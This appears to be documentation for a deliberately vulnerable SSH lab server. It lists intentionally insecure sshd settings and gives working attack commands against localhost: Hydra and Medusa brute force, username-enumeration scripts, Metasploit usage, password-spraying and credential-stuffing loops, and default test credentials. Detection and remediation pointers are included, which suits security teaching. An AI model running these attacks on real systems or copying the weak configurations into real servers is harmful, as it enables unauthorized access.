# SSH Vulnerabilities Documentation

This document details all SSH vulnerabilities implemented in the vulnerable SSH server, along with exploitation techniques and detection methods.

## Table of Contents
1. [SSHv1 Protocol Support](#1-sshv1-protocol-support)
2. [Weak Encryption Algorithms](#2-weak-encryption-algorithms)
3. [Username Enumeration via Timing Attack](#3-username-enumeration-via-timing-attack)
4. [Insecure Authentication Methods](#4-insecure-authentication-methods)
5. [Additional Security Issues](#5-additional-security-issues)

---

## 1. SSHv1 Protocol Support

### Vulnerability Description
**CVE Reference:** CVE-1999-0085, CVE-2001-0572  
**Severity:** CRITICAL  
**CVSS Score:** 9.8

The SSH server is configured to support both SSHv1 and SSHv2 protocols. SSHv1 has known cryptographic weaknesses and is vulnerable to man-in-the-middle attacks.

### Configuration Issue
```bash
# Vulnerable configuration in /etc/ssh/sshd_config
Protocol 2,1  # Allows both SSHv2 and SSHv1
```

### Exploitation

#### Method 1: Banner Grabbing
```bash
# Connect and check banner
nc localhost 2222
# Server responds with: SSH-2.0-OpenSSH_X.X or SSH-1.99-OpenSSH_X.X
```

#### Method 2: Force SSHv1 Connection
```bash
# Attempt SSHv1 connection
ssh -1 -p 2222 testuser@localhost

# Or using telnet/nc
echo "SSH-1.5-TestClient" | nc localhost 2222
```

#### Method 3: Using Nmap
```bash
# Scan for SSH version
nmap -p 2222 --script ssh-hostkey,ssh2-enum-algos localhost

# Output will show supported protocols
```

### Detection
```bash
# Check SSH configuration
docker exec vulnerable-ssh-server cat /etc/ssh/sshd_config | grep Protocol

# Expected vulnerable output:
# Protocol 2,1
```

### Impact
- Man-in-the-middle attacks
- Session hijacking
- Cryptographic weaknesses allow decryption of traffic
- CRC-32 compensation attack detector vulnerability

---

## 2. Weak Encryption Algorithms

### Vulnerability Description
**Severity:** HIGH  
**CVSS Score:** 7.5

The SSH server supports weak and deprecated encryption algorithms, MACs, and key exchange methods that are vulnerable to various cryptographic attacks.

### Vulnerable Algorithms

#### Weak Ciphers
```
3des-cbc          - Triple DES in CBC mode (64-bit block size)
aes128-cbc        - AES-128 in CBC mode (vulnerable to padding oracle)
aes192-cbc        - AES-192 in CBC mode (vulnerable to padding oracle)
aes256-cbc        - AES-256 in CBC mode (vulnerable to padding oracle)
arcfour           - RC4 stream cipher (broken)
arcfour128        - RC4 with 128-bit key (broken)
arcfour256        - RC4 with 256-bit key (broken)
```

#### Weak MACs
```
hmac-md5          - MD5 hash (collision attacks)
hmac-sha1         - SHA1 hash (deprecated)
hmac-ripemd160    - RIPEMD-160 (weak)
```

#### Weak Key Exchange
```
diffie-hellman-group1-sha1         - 1024-bit DH (Logjam attack)
diffie-hellman-group14-sha1        - SHA1-based (deprecated)
diffie-hellman-group-exchange-sha1 - SHA1-based (deprecated)
```

### Configuration Issue
```bash
# Vulnerable configuration in /etc/ssh/sshd_config
Ciphers aes128-cbc,3des-cbc,aes192-cbc,aes256-cbc,arcfour,arcfour128,arcfour256
MACs hmac-md5,hmac-sha1,hmac-ripemd160
KexAlgorithms diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1
```

### Exploitation

#### Test Weak Ciphers
```bash
# Test 3DES-CBC cipher
ssh -c 3des-cbc -p 2222 testuser@localhost

# Test Arcfour (RC4)
ssh -c arcfour -p 2222 testuser@localhost

# Test CBC mode ciphers
ssh -c aes128-cbc -p 2222 testuser@localhost
```

#### Test Weak MACs
```bash
# Test HMAC-MD5
ssh -m hmac-md5 -p 2222 testuser@localhost

# Test HMAC-SHA1
ssh -m hmac-sha1 -p 2222 testuser@localhost
```

#### Test Weak Key Exchange
```bash
# Test DH Group 1 (Logjam vulnerable)
ssh -o "KexAlgorithms=diffie-hellman-group1-sha1" -p 2222 testuser@localhost
```

#### Automated Scanning
```bash
# Using ssh-audit (recommended)
ssh-audit localhost -p 2222

# Using nmap
nmap -p 2222 --script ssh2-enum-algos localhost
```

### Detection
```bash
# List supported algorithms
ssh -Q cipher localhost
ssh -Q mac localhost
ssh -Q kex localhost

# Check server configuration
docker exec vulnerable-ssh-server grep -E "(Ciphers|MACs|KexAlgorithms)" /etc/ssh/sshd_config
```

### Impact
- **CBC Mode Ciphers:** Vulnerable to padding oracle attacks (Lucky 13, BEAST)
- **3DES:** Sweet32 attack (birthday attack on 64-bit block ciphers)
- **RC4/Arcfour:** Multiple biases, practical key recovery attacks
- **HMAC-MD5:** Collision attacks, not cryptographically secure
- **DH Group 1:** Logjam attack, pre-computation attacks on 1024-bit DH

---

## 3. Username Enumeration via Timing Attack

### Vulnerability Description
**CVE Reference:** CVE-2018-15473, CVE-2016-6210  
**Severity:** MEDIUM  
**CVSS Score:** 5.3

The SSH server exhibits timing differences when processing authentication requests for valid vs. invalid usernames, allowing attackers to enumerate valid usernames.

### Root Cause
The server takes different code paths when:
1. Username exists (checks password/key)
2. Username doesn't exist (immediate rejection)

This creates measurable timing differences.

### Exploitation

#### Manual Timing Test
```bash
# Test valid username
time ssh -o PreferredAuthentications=password testuser@localhost -p 2222

# Test invalid username
time ssh -o PreferredAuthentications=password nonexistent@localhost -p 2222

# Compare response times
```

#### Python Script for Enumeration
```python
#!/usr/bin/env python3
import paramiko
import time
import statistics

def test_username(host, port, username, iterations=10):
    times = []
    for _ in range(iterations):
        start = time.time()
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=username, 
                          password='wrongpass', timeout=5)
        except:
            pass
        elapsed = time.time() - start
        times.append(elapsed)
        client.close()
    
    return statistics.mean(times), statistics.stdev(times)

# Test usernames
usernames = ['testuser', 'admin', 'root', 'nonexistent', 'fakeuser']
for user in usernames:
    avg, std = test_username('localhost', 2222, user)
    print(f"{user}: {avg:.4f}s (±{std:.4f}s)")
```

#### Using Metasploit
```bash
# Metasploit module for SSH user enumeration
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS localhost
set RPORT 2222
set USER_FILE /path/to/usernames.txt
run
```

#### Bash Script for Bulk Testing
```bash
#!/bin/bash
# username_enum.sh

HOST="localhost"
PORT="2222"

# List of potential usernames
USERS=("admin" "root" "testuser" "user1" "oracle" "postgres" "mysql")

echo "Testing usernames for timing differences..."
for user in "${USERS[@]}"; do
    echo -n "Testing $user: "
    START=$(date +%s%N)
    timeout 5 ssh -o StrictHostKeyChecking=no \
                 -o UserKnownHostsFile=/dev/null \
                 -o PreferredAuthentications=password \
                 -p $PORT $user@$HOST exit 2>/dev/null
    END=$(date +%s%N)
    ELAPSED=$(( ($END - $START) / 1000000 ))
    echo "${ELAPSED}ms"
done
```

### Detection
```bash
# Monitor SSH logs for enumeration attempts
docker exec vulnerable-ssh-server tail -f /var/log/auth.log

# Look for patterns:
# - Multiple failed attempts with different usernames
# - Rapid connection attempts
# - Connections that disconnect immediately
```

### Impact
- Attackers can identify valid usernames
- Reduces brute-force attack space
- Enables targeted phishing attacks
- Facilitates password spraying attacks

---

## 4. Insecure Authentication Methods

### Vulnerability Description
**Severity:** MEDIUM to HIGH  
**CVSS Score:** 6.5

The SSH server has multiple authentication-related security issues.

### Issues Identified

#### 4.1 Password Authentication Enabled
```bash
# Configuration
PasswordAuthentication yes
```

**Risks:**
- Vulnerable to brute-force attacks
- Password spraying attacks
- Credential stuffing
- No protection against weak passwords

**Exploitation:**
```bash
# Brute force with Hydra
hydra -l testuser -P /usr/share/wordlists/rockyou.txt ssh://localhost:2222

# Using Medusa
medusa -h localhost -n 2222 -u testuser -P passwords.txt -M ssh

# Using Ncrack
ncrack -p 2222 -u testuser -P passwords.txt localhost
```

#### 4.2 Root Login Permitted
```bash
# Configuration
PermitRootLogin yes
```

**Risks:**
- Direct root access if compromised
- No audit trail of privilege escalation
- Violates principle of least privilege

**Exploitation:**
```bash
# Attempt root login
ssh -p 2222 root@localhost
# Password: toor

# Brute force root account
hydra -l root -P passwords.txt ssh://localhost:2222
```

#### 4.3 Weak Host Keys
```bash
# 1024-bit RSA key (weak)
ssh-keygen -t rsa -b 1024 -f /etc/ssh/ssh_host_rsa_key

# DSA key (deprecated)
ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key
```

**Risks:**
- 1024-bit RSA vulnerable to factorization
- DSA deprecated and weak
- Susceptible to man-in-the-middle attacks

**Detection:**
```bash
# Check host key strength
ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub
# Output: 1024 SHA256:... (RSA)  <- WEAK!

# Should be at least 2048 bits
```

#### 4.4 No Rate Limiting
```bash
# No configuration for:
# - MaxAuthTries (set too high or unlimited)
# - LoginGraceTime (too long)
# - No fail2ban or similar protection
```

**Exploitation:**
```bash
# Unlimited authentication attempts
for i in {1..1000}; do
    sshpass -p "attempt$i" ssh -p 2222 testuser@localhost 2>/dev/null
done
```

### Test Credentials
The vulnerable server has these test accounts:

| Username | Password | Notes |
|----------|----------|-------|
| root | toor | Root access |
| testuser | password123 | Weak password |
| admin | admin | Very weak password |
| user1 | user1 | Username as password |
| validuser | ValidPass123! | Stronger password |

### Exploitation Examples

#### Password Spraying
```bash
#!/bin/bash
# password_spray.sh

USERS=("testuser" "admin" "user1" "root")
PASSWORDS=("password123" "admin" "user1" "toor" "123456")

for pass in "${PASSWORDS[@]}"; do
    echo "Trying password: $pass"
    for user in "${USERS[@]}"; do
        sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
                               -p 2222 $user@localhost \
                               "echo 'Success: $user:$pass'" 2>/dev/null
    done
    sleep 1
done
```

#### Credential Stuffing
```bash
# Using compromised credentials from data breaches
while IFS=: read -r user pass; do
    sshpass -p "$pass" ssh -p 2222 $user@localhost "whoami" 2>/dev/null && \
        echo "Valid: $user:$pass"
done < leaked_credentials.txt
```

---

## 5. Additional Security Issues

### 5.1 Verbose Error Messages
The server provides detailed error messages that aid attackers:
```
Permission denied (publickey,password)  # Reveals auth methods
User testuser not allowed               # Confirms username validity
```

### 5.2 No Two-Factor Authentication
```bash
# No 2FA configuration
# ChallengeResponseAuthentication no
# AuthenticationMethods not configured
```

### 5.3 Insecure PAM Configuration
```bash
UsePAM yes  # With default PAM config
```

Allows timing attacks and doesn't enforce strong password policies.

### 5.4 No IP Restrictions
```bash
# No AllowUsers, AllowGroups, or DenyUsers configured
# No Match blocks for IP-based restrictions
```

### 5.5 Long Login Grace Time
```bash
LoginGraceTime 120  # 2 minutes to complete authentication
```

Allows slow brute-force attacks and resource exhaustion.

---

## Testing All Vulnerabilities

### Quick Test Script
```bash
#!/bin/bash
# quick_test.sh

echo "=== SSH Vulnerability Quick Test ==="

# 1. Check SSH version
echo -e "\n[1] SSH Protocol Version:"
nc -w 2 localhost 2222 < /dev/null

# 2. Test weak cipher
echo -e "\n[2] Testing weak cipher (3des-cbc):"
ssh -c 3des-cbc -p 2222 testuser@localhost exit 2>&1 | grep -i cipher

# 3. Username enumeration
echo -e "\n[3] Username enumeration timing:"
echo "Valid user (testuser):"
time (ssh -o PreferredAuthentications=password -p 2222 testuser@localhost exit 2>/dev/null)
echo "Invalid user (fakeuser999):"
time (ssh -o PreferredAuthentications=password -p 2222 fakeuser999@localhost exit 2>/dev/null)

# 4. Test password auth
echo -e "\n[4] Password authentication:"
sshpass -p password123 ssh -p 2222 testuser@localhost "echo 'Password auth works'" 2>/dev/null

# 5. Test root login
echo -e "\n[5] Root login:"
sshpass -p toor ssh -p 2222 root@localhost "echo 'Root login works'" 2>/dev/null

echo -e "\n=== Test Complete ==="
```

### Comprehensive Scan
```bash
# Using ssh-audit (recommended)
ssh-audit localhost:2222 > ssh_audit_report.txt

# Using nmap
nmap -p 2222 --script ssh-auth-methods,ssh-hostkey,ssh2-enum-algos localhost

# Using OpenVAS or Nessus for full vulnerability scan
```

---

## References

- [CVE-1999-0085](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0085) - SSHv1 Protocol Vulnerabilities
- [CVE-2018-15473](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15473) - Username Enumeration
- [CVE-2016-6210](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6210) - User Enumeration via Timing
- [Sweet32 Attack](https://sweet32.info/) - 64-bit Block Cipher Vulnerability
- [Logjam Attack](https://weakdh.org/) - Diffie-Hellman Weakness
- [SSH Best Practices](https://www.ssh.com/academy/ssh/security)

---

## Next Steps

See [`SOLUTIONS.md`](SOLUTIONS.md) for detailed remediation steps and secure SSH configuration.